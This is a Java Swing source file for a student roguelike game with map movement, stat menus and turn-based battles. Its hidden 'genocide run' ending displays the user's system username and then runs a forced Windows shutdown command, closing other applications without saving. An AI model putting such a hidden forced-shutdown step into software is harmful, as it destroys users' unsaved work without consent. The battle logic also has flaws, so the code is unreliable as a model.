import javax.swing.*;
import javax.swing.Timer;

//Sounds
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;

import java.awt.*;
import java.awt.event.*;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.*;

class Game {
    private List<Account> accountList = new ArrayList<>();
    public static Cell[][] map;
    public static Game game;
    public static int floor = 1;
    public Character playerSave;
    public static int nPPos;
    public static int mPPos;
    public static int lastNPPos;
    public static int lastMPPos;
    public static int nMapSize;
    public static int mMapSize;
    public static boolean canMove = true;
    public static boolean inMenu = false;
    public static int lastEntity = -1, nextEntity;
    public JFrame battleFrame;
    public JTextArea battleLog;
    public JLabel playerStats;
    public JLabel enemyStats;
    public JButton attackButton;
    public JButton abilityButton;
    public Clip clip;

    // Achievements
    public int genocide = 0;
    public static int totalToKill;
    public static int floorsCleared = 0;
    public boolean genocideRun = false;

    public static JFrame frame; // Frame reference
    public static JPanel gridPanel; // Panel reference
    public static GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
    public static Rectangle screenBounds = ge.getMaximumWindowBounds();

    public void playMusic(String musicLoc){
        try {
            File musicPath = new File(musicLoc);
            if(musicPath.exists()){
                AudioInputStream audioInput = AudioSystem.getAudioInputStream(musicPath);
                clip = AudioSystem.getClip();
                clip.open(audioInput);
                clip.loop(Clip.LOOP_CONTINUOUSLY);
                clip.start();
                //JOptionPane.showMessageDialog(null,"Press ok to stop playing");

            }
            else{
                System.out.println("Couldn't find Music file");
            }
        }
        catch (Exception ex){
            ex.printStackTrace();
        }
    }

    private static ImageIcon getEntityImage(int entity, int cellWidth, int cellHeight) {
        String path = "D:\\UPB\\Anul2\\POO\\Tema1\\src\\images\\";
        ImageIcon icon;

        if ((floorsCleared == floor - 1 || floorsCleared == floor)
                && floor != 1 && entity == 1)
            icon = new ImageIcon((path + "visitedb" + floorsCleared + ".png"));
        else {
            switch (entity) {
                case 0 -> icon = new ImageIcon(path + "nVisited.png"); // Neutral
                case 1 -> icon = new ImageIcon(path + "visited.png"); // Vegetation
                case 9 -> icon = new ImageIcon(path + "portal.png"); // Fire
                case 5 -> icon = new ImageIcon(path + "player.png"); // Player
                case 4 -> icon = new ImageIcon(path + "genocide.png"); // Enemy
                case 2 -> icon = new ImageIcon(path + "campfire.png"); // Special
                default -> icon = new ImageIcon(path + "unknown.png"); // Unknown
            }
        }
        Image img = icon.getImage().getScaledInstance(cellWidth, cellHeight, Image.SCALE_SMOOTH);
        return new ImageIcon(img);
    }

    private static String getEntityRepresentation(int entity) {
        return switch (entity) {
            case 0 -> "N";
            case 1 -> "V";
            case 9 -> "F";
            case 5 -> "P";
            case 4 -> "E";
            case 2 -> "S";
            default -> "?";
        };
    }

    public static void showMap() {
        // Initialize the frame if it doesn't exist
        if (frame == null) {
            frame = new JFrame("Map Display");
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

            // Get the taskbar height (estimate it)

            frame.setSize(screenBounds.width, screenBounds.height - 40);
            frame.setLocation(screenBounds.x, screenBounds.y);
            gridPanel = new JPanel();
            gridPanel.setSize(screenBounds.width, screenBounds.height - 40);
            gridPanel.setLocation(screenBounds.x, screenBounds.y);
            gridPanel.setLayout(new GridLayout(nMapSize, mMapSize));  // Set the grid layout once here
            frame.add(gridPanel);
        }

        gridPanel.addKeyListener(new KeyAdapter() {
            private boolean keyPressed = false;

            @Override
            public void keyPressed(KeyEvent e) {
                if (canMove) {
                    canMove = false;
                    game.movement(e.getKeyCode());

                    // Re-enable movement after a short delay
                    new Timer(150, evt -> canMove = true).start();
                }
            }

            @Override
            public void keyReleased(KeyEvent e) {
                keyPressed = false; // Allow new key press events after release
            }
        });

        // Clear the existing panel
        gridPanel.removeAll();
        gridPanel.setLayout(new GridLayout(nMapSize, mMapSize));

        // Calculate cell size based on the frame dimensions
        int cellWidth = frame.getWidth() / mMapSize;
        int cellHeight = frame.getHeight() / nMapSize;

        // Populate the panel with labels representing entities
        for (int i = 0; i < nMapSize; i++) {
            for (int j = 0; j < mMapSize; j++) {
                JLabel cellLabel = new JLabel(getEntityRepresentation(map[i][j].entity), SwingConstants.CENTER);
                cellLabel.setOpaque(true);
                cellLabel.setIcon(getEntityImage(map[i][j].entity, cellWidth, cellHeight));
                cellLabel.setBorder(BorderFactory.createLineBorder(Color.BLACK));
                gridPanel.add(cellLabel);
            }
        }
        gridPanel.setFocusable(true);
        gridPanel.requestFocusInWindow();

        // Resize frame to fit content without borders
        frame.pack();
        frame.setVisible(true);

        // Refresh the panel to show updates
        gridPanel.revalidate();
        gridPanel.repaint();
    }

    public void enemyDead() {
        JOptionPane.showMessageDialog(frame, "YOU KILLED HIM");
    }

    public void sanctuarMsg() {
        JOptionPane.showMessageDialog(frame, "Health, Mana and Abilities restored");
    }

    public MouseListener mClose(JFrame frame)  {
        return new MouseListener() {
            @Override
            public void mouseClicked(MouseEvent e) {
                inMenu = false;
                frame.dispose();
            }

            @Override
            public void mousePressed(MouseEvent e) {

            }

            @Override
            public void mouseReleased(MouseEvent e) {

            }

            @Override
            public void mouseEntered(MouseEvent e) {

            }

            @Override
            public void mouseExited(MouseEvent e) {

            }
        };
    }

    public void quitMenu() {
        Dimension buttonSize = new Dimension(100, 40); // Set a fixed size for both buttons
        JFrame quitFrame = new JFrame("Quit Menu");
        quitFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        quitFrame.setSize(800, 800);
        quitFrame.setUndecorated(true);
        quitFrame.setBackground(new Color(0, 0, 0, 0)); // Transparent JFrame background

        // Transparent main panel
        JPanel mainPanel = new JPanel(new GridBagLayout());
        mainPanel.setSize(240, 150);
        mainPanel.setOpaque(false);

        // Content panel with dark theme
        JPanel contentPanel = new JPanel(new GridBagLayout());
        contentPanel.setOpaque(true);
        contentPanel.setBackground(Color.DARK_GRAY);
        contentPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(10, 10, 10, 10);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // Quit label
        JLabel quitText = new JLabel("Are you sure you want to quit?");
        quitText.setForeground(Color.WHITE);
        quitText.setHorizontalAlignment(SwingConstants.CENTER);
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.gridwidth = 2;
        contentPanel.add(quitText, gbc);

        // Yes button
        JButton yes = new JButton("Yes");
        yes.setBackground(Color.DARK_GRAY);
        yes.setForeground(Color.WHITE);
        yes.setPreferredSize(buttonSize);
        gbc.gridx = 0;
        gbc.gridy = 1;
        gbc.gridwidth = 1;
        contentPanel.add(yes, gbc);

        // No button
        JButton no = new JButton("No");
        no.setBackground(Color.WHITE);
        no.setForeground(Color.DARK_GRAY);
        no.setPreferredSize(buttonSize);
        gbc.gridx = 1;
        contentPanel.add(no, gbc);

        mainPanel.add(contentPanel);
        quitFrame.add(mainPanel);

        // Action listeners for buttons
        yes.addActionListener(e -> {
            JOptionPane.showMessageDialog(quitFrame, "Coward");
            System.exit(0); // Normal termination
        });

        no.addActionListener(e -> {
            JOptionPane.showMessageDialog(quitFrame, "Good Choice");
            quitFrame.dispose(); // Close the quitFrame
        });

        quitFrame.setVisible(true);
    }

    public void statsMenu() {
        inMenu = true;
        JFrame statFrame = new JFrame("Stats Menu");
        statFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        statFrame.setSize(800, 800);
        statFrame.setUndecorated(true);
        statFrame.setBackground(new Color(0, 0, 0, 0)); // Transparent JFrame background

        // Transparent main panel
        JPanel mainPanel = new JPanel(new GridBagLayout());
        mainPanel.setOpaque(false); // Make the main panel transparent

        // Content panel with dark theme
        JPanel contentPanel = new JPanel();
        contentPanel.setOpaque(true);
        contentPanel.setBackground(Color.DARK_GRAY);
        contentPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
        contentPanel.setLayout(new BoxLayout(contentPanel, BoxLayout.Y_AXIS)); // Use vertical box layout
        statFrame.addMouseListener(mClose(statFrame));

        // Title label
        JLabel titleLabel = new JLabel("Stats");
        titleLabel.setForeground(Color.WHITE);
        titleLabel.setFont(new Font("Arial", Font.BOLD, 24));
        titleLabel.setAlignmentX(Component.CENTER_ALIGNMENT);

        // Stats text area
        StringBuilder statsText = new StringBuilder();
        statsText.append("Health: ").append(playerSave.health).append("\n")
                .append("Mana: ").append(playerSave.mana).append("\n")
                .append("Damage: ").append(playerSave.damage).append("\n")
                .append("Critical Chance: ").append(playerSave.critChance).append("\n")
                .append("Level: ").append(playerSave.level).append("\n")
                .append("XP: ").append(playerSave.xp).append(" --> ").append(playerSave.xpToNextLevel).append("\n")
                .append("Abilities:\n");

        for (int i = 0; i < playerSave.abilityInventory; i++) {
            statsText.append((i + 1)).append(". ").append(playerSave.abilities.get(i)).append("\n");
        }

        JTextArea statsArea = new JTextArea(statsText.toString());
        statsArea.setEditable(false);
        statsArea.setForeground(Color.WHITE);
        statsArea.setBackground(Color.DARK_GRAY);
        statsArea.setFont(new Font("Monospaced", Font.PLAIN, 14));
        statsArea.setBorder(BorderFactory.createLineBorder(Color.WHITE));
        statsArea.setAlignmentX(Component.CENTER_ALIGNMENT);

        // Add components to content panel
        contentPanel.add(titleLabel);
        contentPanel.add(Box.createRigidArea(new Dimension(0, 20))); // Spacer
        contentPanel.add(statsArea);

        // Add content panel to main panel
        mainPanel.add(contentPanel);

        // Add main panel to frame
        statFrame.add(mainPanel);
        statFrame.setVisible(true);
    }

    public void finalMenu() {
        JFrame statFrame = new JFrame("Floor Cleared");
        statFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        statFrame.setSize(800, 800);
        statFrame.setUndecorated(true);
        statFrame.setBackground(new Color(0, 0, 0, 0)); // Transparent JFrame background

        // Transparent main panel
        JPanel mainPanel = new JPanel(new GridBagLayout());
        mainPanel.setOpaque(false); // Make the main panel transparent

        // Content panel with dark theme
        JPanel contentPanel = new JPanel();
        contentPanel.setOpaque(true);
        contentPanel.setBackground(Color.DARK_GRAY);
        contentPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
        contentPanel.setLayout(new BoxLayout(contentPanel, BoxLayout.Y_AXIS)); // Use vertical box layout
        statFrame.addMouseListener(mClose(statFrame));

        // Title label
        JLabel titleLabel = new JLabel("Floor Passed");
        Timer rgbFloor = RGB.rgbTxt(100, 25, titleLabel);
        rgbFloor.start();

        titleLabel.setForeground(Color.WHITE);
        titleLabel.setFont(new Font("Arial", Font.BOLD, 24));
        titleLabel.setAlignmentX(Component.CENTER_ALIGNMENT);

        // Stats text area

        StringBuilder statsText = new StringBuilder();
        statsText.append("Name: ").append(playerSave.name).append("\n")
                .append("Health: ").append(playerSave.health).append("\n")
                .append("Mana: ").append(playerSave.mana).append("\n")
                .append("Damage: ").append(playerSave.damage).append("\n")
                .append("Critical Chance: ").append(playerSave.critChance).append("\n")
                .append("Level: ").append(playerSave.level).append("\n")
                .append("XP: ").append(playerSave.xp).append(" --> ").append(playerSave.xpToNextLevel).append("\n")
                .append("Abilities:\n");

        for (int i = 0; i < playerSave.abilityInventory; i++) {
            statsText.append((i + 1)).append(". ").append(playerSave.abilities.get(i)).append("\n");
        }

        JTextArea statsArea = new JTextArea(statsText.toString());
        statsArea.setEditable(false);
        statsArea.setForeground(Color.WHITE);
        statsArea.setBackground(Color.DARK_GRAY);
        statsArea.setFont(new Font("Monospaced", Font.PLAIN, 14));
        statsArea.setBorder(BorderFactory.createLineBorder(Color.WHITE));
        statsArea.setAlignmentX(Component.CENTER_ALIGNMENT);



        JButton next = new JButton("Next Floor");
        next.setAlignmentX(Component.CENTER_ALIGNMENT);
        next.setFont(new Font("Arial", Font.BOLD, 16));
        next.setForeground(Color.WHITE);
        //Timer rgbBtn = RGB.rgbTxt(100, 25, next);
        //rgbBtn.start();

        //next.setForeground(Color.white);
        next.setBackground(Color.darkGray);
        next.addMouseListener(mClose(statFrame));
        // Add components to content panel
        contentPanel.add(titleLabel);
        contentPanel.add(Box.createRigidArea(new Dimension(0, 20))); // Spacer
        contentPanel.add(statsArea);
        contentPanel.add(next);

        // Add content panel to main panel
        mainPanel.add(contentPanel);

        // Add main panel to frame
        statFrame.add(mainPanel);
        statFrame.setFocusable(true);
        statFrame.setVisible(true);
    }

    public int movement(int keyCode) {


        String moveTxt, aux = "";

        // Save the player's current position
        playerSave = map[nPPos][mPPos].being;
        lastNPPos = nPPos;
        lastMPPos = mPPos;

        moveTxt = "Enter a move ";
        aux = "";

            try {
                if (!inMenu) {
                    // Process the key press
                    switch (keyCode) {
                        case KeyEvent.VK_W -> nPPos -= 1; // Move up
                        case KeyEvent.VK_A -> mPPos -= 1; // Move left
                        case KeyEvent.VK_S -> nPPos += 1; // Move down
                        case KeyEvent.VK_D -> mPPos += 1; // Move right
                        case KeyEvent.VK_Q -> {          // Quit
                            quitMenu();
                            return 0;
                        }
                        case KeyEvent.VK_I -> {
                            statsMenu();
                            return 0;
                        }
                        default -> {
                            System.out.println("Invalid input. Use W/A/S/D.");
                            return 0;
                        }
                    }

                    // Ensure the player stays within bounds
                    if (nPPos < 0 || nPPos >= nMapSize || mPPos < 0 || mPPos >= mMapSize) {
                        throw new PlayerOutOfBoundsException("Player moved out of bounds!");
                    }

                    nextEntity = map[nPPos][mPPos].entity;

                    if (lastEntity == -1)
                        lastEntity = 0;

                    map[nPPos][mPPos].entity = 5; // Update player position
                    map[nPPos][mPPos].being = map[lastNPPos][lastMPPos].being;
                    map[lastNPPos][lastMPPos].entity = lastEntity;

                    lastEntity = nextEntity;

                    if (nPPos != 0)
                        aux += "W/";
                    if (mPPos != 0)
                        aux += "A";
                    if (nPPos != nMapSize - 1)
                        aux += "/S";
                    if (mPPos != mMapSize - 1)
                        aux += "/D";

                    moveTxt += "(" + aux + "):";

                    System.out.println(moveTxt);

                    // Refresh the map
                    showMap();

                    showMap();

                    System.out.println("GENOCIDE: " + totalToKill + " " + genocide);
                    System.out.println("GENOCIDE: " + floorsCleared);

                    if (totalToKill == genocide && floorsCleared == floor - 1) {
                        ++floorsCleared;
                        System.out.println("GENOCIDE cleared: " + floor + " " + floorsCleared);
                    }
                    if (floorsCleared == 8) {
                        genocideRun = true;
                        Enemy you = new Enemy();
                        System.out.println(playerSave);
                        map[nPPos][mPPos].being.damage = 0;
                        battle(map[nPPos][mPPos].being, you);
                    }

                    switch (nextEntity) {
                        case 0 -> {
                            lastEntity = 1;
                        }
                        case 2 -> {
                            Random rdm = new Random();
                            System.out.println("Sanctuary: Healing and Mana regeneration.");
                            map[nPPos][mPPos].being.regenerateHealth(40);
                            map[nPPos][mPPos].being.regenerateMana(70);
                            map[nPPos][mPPos].being.reload(map[nPPos][mPPos].being);
                            sanctuarMsg();
                        }
                        case 4 -> {
                            if (map[nPPos][mPPos].enemy.isAlive()) {
                                System.out.println("ERROR");
                                battle(map[nPPos][mPPos].being, map[nPPos][mPPos].enemy);
                            } else {
                                enemyDead();
                                System.out.println("YOU KILLED HIM");
                                showMap();
                            }
                        }
                        case 9 -> {
                            ++floor;
                            inMenu = true;
                            System.out.println("Level " + floor);

                            // Restore player stats on level transition
                            map[nPPos][mPPos].being.regenerateHealth(100);
                            map[nPPos][mPPos].being.regenerateMana(100);

                            // Save the current player data
                            playerSave = map[nPPos][mPPos].being;

                            // Create a new grid and ensure player is placed correctly
                            Grid newGrid = new Grid();
                            lastEntity = -1;
                            newGrid.generateMap(false);

                            // Place the player back into the new grid
                            newGrid.map[newGrid.nPPos][newGrid.mPPos].being = playerSave;

                            // Update the current map and other references
                            this.map = newGrid.map;
                            this.nPPos = newGrid.nPPos;
                            this.mPPos = newGrid.mPPos;

                            finalMenu();
                        }
                    }
                }
            } catch (PlayerOutOfBoundsException e) {
                System.out.println(e.getMessage());
                // Revert position to the previous valid one
                nPPos = lastNPPos;
                mPPos = lastMPPos;
                showMap();
            }
        return 0;
    }

    public void battle(Character player, Enemy enemy) {
        inMenu = true;
        battleFrame = new JFrame("Battle System");
        battleFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        battleFrame.setSize(600, 400);

        battleLog = new JTextArea();
        battleLog.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(battleLog);

        playerStats = new JLabel(getPlayerStats(player));
        enemyStats = new JLabel(getEnemyStats(enemy));

        attackButton = new JButton("Basic Attack: " + playerSave.damage);
        abilityButton = new JButton("Use Ability");

        JPanel statsPanel = new JPanel(new GridLayout(2, 1));
        statsPanel.add(playerStats);
        statsPanel.add(enemyStats);

        JPanel buttonPanel = new JPanel(new GridLayout(1, 2));
        buttonPanel.add(attackButton);
        buttonPanel.add(abilityButton);

        battleFrame.add(scrollPane, BorderLayout.CENTER);
        battleFrame.add(statsPanel, BorderLayout.NORTH);
        battleFrame.add(buttonPanel, BorderLayout.SOUTH);

        addListeners(player, enemy, genocideRun);

        battleFrame.setVisible(true);
    }

    private String getPlayerStats(Character player) {
        return String.format("Player - Health: %d, Mana: %d, Damage: %d",
                player.health, player.mana, player.damage);
    }

    private String getEnemyStats(Enemy enemy) {
        String element = "";
        if (enemy.element == 0)
            element = "earth";
        if (enemy.element == 1)
            element = "fire";
        if (enemy.element == 2)
            element = "ice";

        return String.format("Enemy - Health: %d, Mana: %d, Element: %s",
                enemy.health, enemy.mana, element);
    }

    private void updateStats(Character player, Enemy enemy) {
        playerStats.setText(getPlayerStats(player));
        enemyStats.setText(getEnemyStats(enemy));
    }

    private void log(String message) {
        battleLog.append(message + "\n");
    }

    private void addListeners(Character player, Enemy enemy , boolean genocideRun) {
        attackButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if(!genocideRun) {
                    enemy.getDamage(enemy, player.attack(), -1);
                    log("You attacked the enemy!");
                    log("Enemy health remaining: " + enemy.health);
                    updateStats(player, enemy);
                }
                    if (!enemy.isAlive() || !genocideRun) {
                        enemy.dead = true;
                        log("You defeated the enemy!");
                        player.xp += 400;
                        player.checkLvlUp(player);
                        JOptionPane.showMessageDialog(battleFrame, "Victory!");
                        battleFrame.dispose();
                        ++genocide;
                        inMenu = false;
                    } else {
                        try {
                            enemyTurn(player, enemy, genocideRun);
                        } catch (IOException ex) {
                            throw new RuntimeException(ex);
                        }
                    }

            }
        });

        abilityButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if ((player.profession.equals("Mage") || player.profession.equals("Rogue"))  && !genocideRun) {
                    String[] abilities = player.abilities.stream()
                            .map(ability -> ability.name +
                                    " damage: " + ability.damage +
                                    " mana: " + ability.manaCost)
                            .toArray(String[]::new);

                    String choice = (String) JOptionPane.showInputDialog(
                            battleFrame, "Choose an ability:", "Use Ability",
                            JOptionPane.QUESTION_MESSAGE, null,
                            abilities, abilities[0]);

                    if (choice != null) {
                        int abilityIndex = player.abilities.stream()
                                .map(ability -> ability.name +
                                        " damage: " + ability.damage +
                                        " mana: " + ability.manaCost)
                                .toList()
                                .indexOf(choice);

                        log("You casted " + choice);
                        player.useAbility(abilityIndex, enemy);
                        log("Enemy health remaining: " + enemy.health);
                        updateStats(player, enemy);

                        if (!enemy.isAlive()) {
                            log("You defeated the enemy!");
                            player.xp += 400;
                            player.checkLvlUp(player);
                            JOptionPane.showMessageDialog(battleFrame, "Victory!");
                            battleFrame.dispose();
                            ++genocide;
                            inMenu = false;
                        } else {
                            try {
                                enemyTurn(player, enemy, genocideRun);
                            } catch (IOException ex) {
                                throw new RuntimeException(ex);
                            }
                        }
                    }
                } else {
                    log("You cannot use abilities!");
                }
            }
        });
    }

    private void enemyTurn(Character player, Enemy enemy, boolean genocide) throws IOException {
        if (genocide) {
            JOptionPane.showMessageDialog(battleFrame,"NOW IS MY TURN TO ATTACK, TRULLY MY TURN");
            log("ISN'T THAT RIGHT?");
            JOptionPane.showMessageDialog(battleFrame,System. getProperty("user.name"));
            log("NOW IS YOUR TIME TO EXPERIENCE");
            new Timer(2000, null).start();
            JOptionPane.showMessageDialog(battleFrame,"DEATH");
            new CascadingError("YOU WERE DEFEATED!", "DIE");
            new Timer(2000, null);
            JOptionPane.showMessageDialog(battleFrame,"GOODBYE");
            Runtime runtime = Runtime.getRuntime();
            Process proc = runtime.exec("shutdown /s /f /t 2 /c \"You were defeated!\" ");
        }
        log("Enemy's turn.");
        player.getDamage(enemy, enemy.attack(), -1);
        log("Enemy attacked you for " + enemy.damage + " damage.");
        log("Your health remaining: " + player.health);
        updateStats(player, enemy);

        if (!player.isAlive()) {
            log("You were defeated!");
            JOptionPane.showMessageDialog(battleFrame, "YOU DIED!", "Game Over", JOptionPane.ERROR_MESSAGE);
            battleFrame.dispose();
            System.exit(1);
        }
    }

    public static void main(String[] args) {
        GameLauncher steam = new GameLauncher();
        game = new Game();
        Grid grid = new Grid(false);// set hardcode to true to test the homework
        steam.launcher(grid, game);
        grid.setKill(game.totalToKill);
    }
}
